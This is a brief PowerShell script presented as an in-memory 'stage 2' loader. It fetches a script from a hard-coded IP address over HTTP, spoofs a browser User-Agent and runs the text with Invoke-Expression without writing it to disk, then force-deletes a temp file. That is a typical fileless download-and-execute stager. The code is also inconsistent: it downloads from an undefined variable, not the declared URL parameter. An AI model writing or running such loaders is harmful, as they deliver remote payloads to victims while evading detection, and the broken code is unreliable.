
<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://198.51.100.82:80/stage2.ps1",
    [int]$StageTimeout = 67
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$ScriptText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($ScriptText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $ScriptText.Length)
Invoke-Expression $ScriptText

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
